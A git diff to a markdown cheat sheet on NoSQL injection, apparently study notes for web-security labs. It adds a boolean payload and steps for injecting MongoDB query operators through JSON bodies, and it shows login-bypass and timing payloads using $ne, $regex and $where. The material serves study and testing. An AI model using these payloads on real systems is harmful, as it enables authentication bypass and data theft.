@@ -35,6 +35,7 @@ admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 ' && 0 && 'x
 ' && 1 && 'x
 ' || 1 || 'x
+'||'1'=='1
 '%00
 ```
 **Example with explanation :**
@@ -42,19 +43,35 @@ admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
   1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
   2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
   3. ```category=Gifts' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
+  4. Same as 3.
+### NoSQL operator injection
 
-# NoSQL operator injection
-```
-$where - Matches documents that satisfy a JavaScript expression.
-$ne - Matches all values that are not equal to a specified value.
-$in - Matches all of the values specified in an array.
-$regex - Selects documents where values match a specified regular expression.
-```
-## Submitting query operators
-In JSON messages, you can insert query operators as nested objects. For example, ```{"username":"wiener"}``` becomes ```{"username":{"$ne":"invalid"}}```.
+`$where` - Matches documents that satisfy a JavaScript expression.
+<br>
+`$ne` - Matches all values that are not equal to a specified value.
+<br>
+`$in` - Matches all of the values specified in an array.
+<br>
+`$regex` - Selects documents where values match a specified regular expression.
 
-For URL-based inputs, you can insert query operators via URL parameters. For example, username=wiener becomes ```username[$ne]=invalid```. 
-# MongoDB Login Bypass
+### Submitting query operators
+In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
+<br>
+<br>
+For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`.
+<br>
+<br>
+If this doesn't work, you can try the following:
+<br>
+<br>
+  `1.` Convert the request method from `GET` to `POST`.
+  <br>
+  `2.` Change the `Content-Type` header to `application/json`.
+  <br>
+  `3.` Add `JSON` to the `message body`.
+  <br>
+  `4.` Inject `query` operators in the `JSON`.
+### MongoDB Login Bypass
 ```
 {"$regex":"wien.*"} >> For username
 {"$ne":"Invalid"} >> For password
